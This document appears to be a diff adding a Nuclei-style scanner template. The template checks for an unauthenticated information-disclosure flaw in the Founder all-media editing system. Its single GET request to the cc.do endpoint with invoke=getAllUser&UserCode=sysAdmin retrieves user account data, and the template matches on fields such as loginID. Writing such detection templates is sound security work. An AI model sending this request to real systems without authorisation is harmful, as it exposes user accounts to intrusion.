@@ -1,0 +1,28 @@
+id: fzmediaeditor-info-diclosure
+
+info:
+  name: 方正畅享全媒体采编系统 cc.do 信息泄露漏洞
+  author: bl
+  severity: medium
+  description: |
+    敏感信息泄露漏洞是指由于系统或应用程序的安全措施不足，导致敏感信息（如用户数据、系统配置、内部通信等）被未授权的第三方获取。这种漏洞可能由于不当的配置、缺乏访问控制、不安全的数据处理和传输等原因造成。攻击者可能利用泄露的信息进行进一步的攻击，如身份盗窃、欺诈、数据篡改等。
+  tags: FOUNDER-全媒体采编系统
+  classification:
+    cwe-id: CWE-862
+
+http:
+  - method: GET
+    path:
+      - '{{BaseURL}}/newsedit/msg/cc.do?invoke=getAllUser&UserCode=sysAdmin'
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - name
+          - code
+          - loginID
+          - <isActive>
+        condition: and
+      - type: status
+        status:
+          - 200
